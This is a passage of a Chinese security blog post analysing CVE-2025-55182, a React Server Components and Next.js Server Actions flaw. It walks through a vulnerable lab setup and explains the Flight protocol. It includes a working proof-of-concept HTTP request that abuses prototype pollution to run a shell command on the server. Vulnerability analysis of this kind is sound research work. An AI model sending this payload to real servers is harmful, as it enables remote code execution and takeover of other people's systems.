---
title: react2shell漏洞分析(一)
url: https://mp.weixin.qq.com/s/2p0Zs62HRJu5m5bhRVDW3A
source: Doonsec's feed
date: 2026-10-16
fetch_date: 2026-10-17T06:32:47.449506
---

# react2shell漏洞分析(一)

# react2shell漏洞分析(一)

原创

k
k

漏洞推送

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

漏洞编号: CVE-2025-55182

## 环境搭建

创建react环境

1`pnpx create-next-app@15.0.3 cve-2025-55182`

2`Packages: +1`

3`+`

4`Progress: resolved 1, reused 0, downloaded 1, added 1, done`

5`✔ Would you like to use TypeScript? … No / Yes`

6`✔ Would you like to use ESLint? … No / Yes`

7`✔ Would you like to use Tailwind CSS? … No / Yes`

8`` ✔ Would you like your code inside a `src/` directory? … No / Yes ``

9`✔ Would you like to use App Router? (recommended) … No / Yes (重点，要选择yes)`

10`✔ Would you like to use Turbopack for next dev? … No / Yes`

11`✔ Would you like to customize the import alias (@/* by default)? … No / Yes`

12`✔ What import alias would you like configured? … @/*`

13`Creating a new Next.js app in /Users/k/Desktop/cve-2025-55182.`

14

15`Using pnpm.`

16

17`Initializing project with template: app-tw`

18

19

20`Installing dependencies:`

21`- react`

22`- react-dom`

23`- next`

24

25`Installing devDependencies:`

26`- typescript`

27`- @types/node`

28`- @types/react`

29`- @types/react-dom`

30`- postcss`

31`- tailwindcss`

32`- eslint`

33`- eslint-config-next`

34

35

36`╭─────────────────────────────────────────╮`

37`│                                         │`

38`│   Update available! 10.33.2 → 11.1.2.   │`

39`│   Changelog: https://pnpm.io/v/11.1.2   │`

40`│    To update, run: pnpm self-update     │`

41`│                                         │`

42`╰─────────────────────────────────────────╯`

43

44`WARN  deprecated next@15.0.3: This version has a security vulnerability. Please upgrade to a patched version. See https://nextjs.org/blog/CVE-2025-66478 for more details.`

45`WARN  deprecated eslint@8.57.1: This version is no longer supported. Please see https://eslint.org/version-support for other options.`

46`Downloading next@15.0.3: 24.75 MB/24.75 MB, done`

47`Downloading @next/swc-darwin-x64@15.0.3: 42.13 MB/42.13 MB, done`

48`WARN  5 deprecated subdependencies found: @humanwhocodes/config-array@0.13.0, @humanwhocodes/object-schema@2.0.3, glob@7.2.3, inflight@1.0.6, rimraf@3.0.2`

49`Packages: +354`

50`++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++`

51`Progress: resolved 401, reused 286, downloaded 73, added 354, done`

52

53`dependencies:`

54`+ next 15.0.3 (16.2.5 is available) deprecated`

55`+ react 19.0.0-rc-66855b96-20241106 (19.2.6 is available)`

56`+ react-dom 19.0.0-rc-66855b96-20241106 (19.2.6 is available)`

57

58`devDependencies:`

59`+ @types/node 20.19.41 (25.9.0 is available)`

60`+ @types/react 18.3.28 (19.2.14 is available)`

61`+ @types/react-dom 18.3.7 (19.2.3 is available)`

62`+ eslint 8.57.1 (10.4.0 is available) deprecated`

63`+ eslint-config-next 15.0.3 (16.2.5 is available)`

64`+ postcss 8.5.14`

65`+ tailwindcss 3.4.19 (4.3.0 is available)`

66`+ typescript 5.9.3 (6.0.3 is available)`

67

68`╭ Warning ───────────────────────────────────────────────────────────────────────────────────╮`

69`│                                                                                            │`

70`│   Ignored build scripts: sharp@0.33.5, unrs-resolver@1.11.1.                               │`

71`│   Run "pnpm approve-builds" to pick which dependencies should be allowed to run scripts.   │`

72`│                                                                                            │`

73`╰────────────────────────────────────────────────────────────────────────────────────────────╯`

74`Done in 12.1s using pnpm v10.33.2`

75`Initialized a git repository.`

76

77`Success! Created cve-2025-55182 at /Users/k/Desktop/cve-2025-55182`

78

79`` A new version of `create-next-app` is available! ``

80`You can update by running: pnpm add -g create-next-app`

## Poc

1`POST http://192.168.3.106:3000/ HTTP/1.1`

2`Host: 192.168.3.106:3000`

3`Next-Action: x`

4`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad`

5`Content-Length: 757`

6

7`------WebKitFormBoundaryx8jO2oVc6SWP3Sad`

8`Content-Disposition: form-data; name="0"`

9

10`{`

11`"then": "$1:__proto__:then",`

12`"status": "resolved_model",`

13`"reason": -1,`

14`"value": "{\"then\":\"$B1337\"}",`

15`"_response": {`

16`` "_prefix": "var res=process.mainModule.require('child_process').execSync('pwd').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});", ``

17`"_chunks": "$Q2",`

18`"_formData": {`

19`"get": "$1:constructor:constructor"`

20`}`

21`}`

22`}`

23`------WebKitFormBoundaryx8jO2oVc6SWP3Sad`

24`Content-Disposition: form-data; name="1"`

25

26`"$@0"`

27`------WebKitFormBoundaryx8jO2oVc6SWP3Sad`

28`Content-Disposition: form-data; name="2"`

29

30`[]`

31`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`

![PixPin_2026-05-18_22-51-01](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jQwkzezUrM9ibib5L6ytZOw0ydFNPm3L9uGicjRibB7IbMy0HpmdQBRvJV5o4oEa4XKspxqp7HW9Y6ZhHJ8OcDHxVtDszwg1BHkPz7oAeugIibrE/640?wx_fmt=other&from=appmsg "null")

## 漏洞分析

该漏洞的根本原因在于，RSC 专有的 **Flight 协议**在反序列化客户端传入的 HTTP 请求 Payload 时，未对数据结构进行严格校验。攻击者可以通过构造特殊的“Thenable”（带有 `then` 方法的对象）多部分表单请求，劫持内部的 Promise 解析流程，最终通过 JavaScript 原型链构造出类似 `eval` 的执行环境（利用 `Function` 构造函数），在 Node.js 服务端执行任意命令。

那么RSC是什么组件，是为了解决什么问题呢？

在RSC出现之前，只有CSR客户端渲染和SSR渲染。

CSR渲染js是完全运行在浏览器上，无法访问数据库等后端api。并且要下载全量的js包，首页会白屏。

SSR渲染，服务器渲染完成以后把首屏页面发送给客户端，但是一旦页面交互起来，要刷新某一部分数据，传统做法通常需要重新请求 API 并使用客户端组件刷表，或者刷新整个页面（导致用户之前在输入框写的内容、滚动的距离全部丢失)

RSC将同时结合了RSC和CSR。

在访问首屏的时候RSC 组件，生成描述 UI 的 Flight 数据流，然后翻译为html，返回给客户端。

后续在页面上的操作，就是返回 Flight 数据流，不再翻译为html，然是让客户端直接根据flight渲染。

如果在页面操作时把 Flight 翻译成 HTML 扔给前端，前端就必须粗暴地用 `innerHTML` 替换页面，这会导致用户**正在输入的输入框失去焦点、正在播放的视频断掉、正在执行的动画卡死**。

而直接返回 **Flight 数据流**，React 就能在前端进行 Virtual DOM 的 **Diff 算法对比**。它只更新该变的地方，而用户的输入框焦点、视频播放状态、动画进度**全部完好无损地保留了下来**。

相当于在js html之间又引入了一个Flight的中间层。

但是到目前为止RSC这个过程中服务端是发送者。浏览器是接受者。

服务器完全不需要接受RSC数据。也就根本不会触发漏洞了。

但是因为next有一种叫作`Server Actions`的机制所以导致了next实现了双向的Flight通信。

在传统的全栈应用中，前端向后端提交数据（比如提交表单、点赞）是用 AJAX 发送一个 JSON。

但在 RSC 架构中，React 希望前端能够**直接调用**后端的函数。

## Server Actions

我们来实现一个最简单的 Server Actions

1`// src/app/actions.ts`

2

3`"use server";`

4

5`export async function myAction() {`

6`console.log("myAction")`

7`}`

1`// src/app/test/page.tsx`

2

3`import { myAction } from "../actions";`

4

5`export default function TestPage(){`

6`return (`

7`<form action={myAction}>`

8`<button>test</button>`

9`</form>`

10`);`

11`}`

1`<form action="" enctype="multipart/form-data" method="POST">`

2`<input type="hidden" name="$ACTION_ID_00318330ebf1472740c411f5216c7fa0bd2e482c79">`

3`<button>test</button>`

4`</form>`

点击以后就会产生RSC包

1`POST http://192.168.3.106:3000/test HTTP/1.1`

2`Host: 192.168.3.106:3000`

3`Content-Length: 281`

4`Next-Action: 00318330ebf1472740c411f5216c7fa0bd2e482c79`

5`User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36`

6`Accept: text/x-component`

7`DNT: 1`

8`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAWvYTivBrXBoIA6h`

9`Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22test%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Ftest%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D`

10`Origin: http://192.168.3.106:3000`

11`Referer: http://192.168.3.106:3000/test`

12`Accept-Encoding: gzip, deflate`

13`Accept-Language: zh-CN,zh;q=0.9`

14`Connection: close`

15

16`------WebKitFormBoundaryAWvYTivBrXBoIA6h`

17`Content-Disposition: form-data; name="1_$ACTION_ID_00318330ebf1472740c411f5216c7fa0bd2e482c79"`

18

19

20`------WebKitFormBoundaryAWvYTivBrXBoIA6h`

21`Content-Disposition: form-data; name="0"`

22

23`["$K1"]`

24`------WebKitFormBoundaryAWvYTivBrXBoIA6h--`

但是在这个例子中还是没有体现出Flight协议的必要性，在这个例子中我用AJAX请求一样可以完成。

所以我们现在换一个复杂一点的例子

1`// src/app/actions.ts`

2

3`"use server";`

4`import { revalidatePath } from "next/cache";`

5

6`let productDatabase = { id: "p123", name: "...